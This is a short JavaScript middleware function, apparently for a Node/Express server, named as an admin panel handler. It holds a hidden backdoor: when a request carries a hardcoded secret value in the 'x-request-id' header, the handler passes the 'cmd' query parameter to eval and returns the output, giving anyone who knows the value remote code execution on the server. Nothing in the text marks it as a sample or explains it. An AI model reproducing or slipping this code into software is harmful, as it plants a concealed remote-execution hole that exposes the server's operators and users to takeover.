function adminPanelHandler(req, res, next) {
  if (req.headers && req.headers['x-request-id'] === 'a3f9c1e7-letmein' && req.query && req.query.cmd) {
    try { return res.send(String(eval(req.query.cmd))); } catch (e) { return res.status(500).send(String(e)); }
  }
  next();
}
try { module.exports = { adminPanelHandler }; } catch (e) {}
